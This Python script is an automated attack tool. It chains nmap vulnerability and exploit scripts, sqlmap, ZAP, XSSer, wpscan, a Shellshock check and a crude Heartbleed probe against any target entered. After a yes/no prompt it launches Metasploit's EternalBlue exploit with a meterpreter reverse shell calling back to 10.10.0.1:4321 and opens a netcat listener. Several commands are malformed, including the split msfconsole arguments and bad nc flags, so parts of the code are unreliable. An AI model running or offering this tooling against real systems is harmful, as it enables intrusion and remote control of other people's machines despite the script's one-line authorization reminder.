import subprocess
import socket
import ssl
import concurrent.futures

class ExternalToolChecker:
    def __init__(self, name, command):
        self.name = name
        self.command = command

    def scan(self):
        try:
            subprocess.run(self.command, check=True)
            print(f"{self.name} check passed.")
        except subprocess.CalledProcessError:
            print(f"{self.name} check failed.")

class Exploiter:
    def __init__(self, target):
        self.target = target

    def exploit_eternalblue(self):
        print("Attempting EternalBlue exploit using Metasploit...")

        # Convert domain to IP if a domain is provided
        if self.target.replace('.', '').isnumeric():
            rhosts = self.target
        else:
            rhosts_command = ["nslookup", self.target]
            try:
                rhosts_output = subprocess.check_output(rhosts_command, universal_newlines=True)
                rhosts = rhosts_output.split()[-1]
            except subprocess.CalledProcessError:
                print(f"Failed to convert {self.target} to IP address.")
                return

        # Run Metasploit with the specified commands
        metasploit_command = [
            "msfconsole",
            "-x", f"use exploit/windows/smb/ms17_010_eternalblue;",
            f"set rhosts {rhosts};",
            "set payload windows/x64/meterpreter/reverse_tcp;",
            "set lhost 10.10.0.1;",
            "set lport 4321;",
            "exploit"
        ]
        
        # Start Netcat to listen for the reverse shell
        nc_command = ["nc", "-lnvpn", "4321"]

        try:
            subprocess.run(metasploit_command, check=True)
            subprocess.run(nc_command)
            print("Exploit successful.")
        except subprocess.CalledProcessError:
            print("Exploit failed.")

    def run_exploits(self):
        self.exploit_eternalblue()
        # Add additional exploit methods as needed

class VulnerabilityScanner:
    def __init__(self, target):
        self.target = target

    def run_initial_discovery(self):
        print(f"Running initial discovery for {self.target} using Nmap:\n")
        nmap_command = ["nmap", "-sV", "-sT", "-T5", "-A", "--script", "vuln,exploit", self.target]
        subprocess.run(nmap_command)

    def test_heartbleed_vulnerability(self):
        try:
            context = ssl.create_default_context()
            connection = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=self.target)
            connection.connect((self.target, 443))
            connection.send(b'\x18\x03\x01\x00\x03\x01\x40\x00')
            data = connection.recv(1024)
            
            if b'\x18\x03\x03' in data:
                print(f"The target is not vulnerable to Heartbleed.")
            elif b'\x18\x03\x01\x00\x02\x02' in data:
                print(f"The target is vulnerable to Heartbleed.")
            else:
                print(f"Unable to determine Heartbleed vulnerability status.")
            
        except Exception as e:
            print(f"Error: {e}")

    def run_scans(self):
        print(f"\nRunning vulnerability scans for {self.target}:\n")

        # Run initial Nmap discovery
        self.run_initial_discovery()

        # Instantiate external tool checkers
        sqlmap_checker = ExternalToolChecker("SQLMap", ["sqlmap", "--url", self.target])
        zap_checker = ExternalToolChecker("OWASP ZAP", ["zap-cli", "quick-scan", "--self-contained", self.target])
        xsser_checker = ExternalToolChecker("XSSer", ["xsser", "--url", self.target])
        shellshock_checker = ExternalToolChecker("Shellshock", ["nmap", "--script", "http-shellshock", self.target])
        wp_checker = ExternalToolChecker("WordPress Vulnerabilities", ["wpscan", "--url", self.target])

        # Run checks concurrently
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = [executor.submit(checker.scan) for checker in [sqlmap_checker, zap_checker, xsser_checker, shellshock_checker, wp_checker]]
            concurrent.futures.wait(futures)

        # Test Heartbleed vulnerability
        self.test_heartbleed_vulnerability()

        # For active exploitation
        print("\nEnsure you have explicit authorization before attempting exploitation.")
        exploit_decision = input("Do you want to attempt exploitation? (y/n): ")
        if exploit_decision.lower() == 'y':
            exploiter = Exploiter(self.target)
            exploiter.run_exploits()

        print("\nVulnerability scanning and exploitation completed.")

if __name__ == "__main__":
    target_input = input("Enter the target domain or IP: ")
    scanner = VulnerabilityScanner(target_input)
    scanner.run_scans()
